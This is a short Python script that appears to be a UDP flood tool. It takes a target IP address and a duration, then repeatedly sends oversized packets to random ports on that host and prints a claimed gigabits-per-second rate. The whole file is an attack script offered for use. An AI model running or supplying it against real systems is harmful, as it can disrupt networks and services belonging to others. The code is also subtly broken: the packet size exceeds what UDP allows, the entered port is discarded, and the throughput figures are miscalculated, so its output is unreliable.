import socket
import time
import random

# Function to transmit the packet to the target IP and port using UDP
def transmit_packet(target_ip, target_port, packet_size_bytes):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        packet = b'\x02\x00\x00\x00\x00\x00\x00\x00' * (packet_size_bytes // 8)
        s.sendto(packet, (target_ip, target_port))

# Get user input for the target IP address, port, and duration in seconds
target_ip = input("Enter the target IP address: ")
try:
    target_port = int(input("Enter the target port: "))
    duration_seconds = float(input("Enter the duration of transmission in seconds: "))
except ValueError:
    print("Invalid input. Please enter valid numeric values.")
    exit()

# Set the packet size in gigabits (assuming you want to keep it as 50 Gbps)
packet_size_gbps = 50

# Convert the packet size to bytes
packet_size_bytes = int(packet_size_gbps * 1024 * 1024 // 8)

# Calculate the number of packets transmitted per second (adjust this value as needed)
packets_per_second = 1000

# Calculate the total number of packets to transmit within the given duration
total_packets = int(packets_per_second * duration_seconds)

# Measure the time taken to transmit 'total_packets' packets
start_time = time.time()
end_time = start_time + duration_seconds

while time.time() < end_time:
    # Randomly select a port between 1 and 65535 (inclusive)
    target_port = random.randrange(1, 65536)
    transmit_packet(target_ip, target_port, packet_size_bytes)

# Calculate the total time taken to transmit 'total_packets' packets
total_time = time.time() - start_time

# Calculate the data transmitted in gigabits per second (Gbps)
data_transmitted_gbps = packet_size_gbps * total_packets

# Calculate the actual Gbps rate
gbps_rate = data_transmitted_gbps / total_time

print(f"\nTransmitted {total_packets} packets to {target_ip}:{target_port} with a total data size of {data_transmitted_gbps:.2f} Gbps.")
print(f"Average Gbps rate: {gbps_rate:.2f} Gbps")
